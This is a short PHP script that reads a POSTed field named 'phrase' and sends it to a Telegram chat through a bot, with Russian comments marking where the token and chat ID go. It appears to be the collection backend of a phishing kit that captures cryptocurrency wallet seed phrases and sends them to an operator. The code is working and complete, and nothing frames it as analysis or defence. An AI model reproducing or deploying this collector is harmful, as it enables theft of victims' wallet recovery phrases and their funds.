<?php

function sendMessage($chatID, $message, $token) {
    // echo "sending message to " . $chatID . "\n ";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID . "&parse_mode=HTML";
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    // echo $result;
    return $result;
}

$phrase = $_POST['phrase'];

$token = ''; // Токен бота тг
$chatID = ''; // Айди чата тг

$text = "<b>Новая фраза!</b>\n<b>Фраза: </b><code>". $phrase ."</code>";
sendMessage($chatID, $text, $token);

?>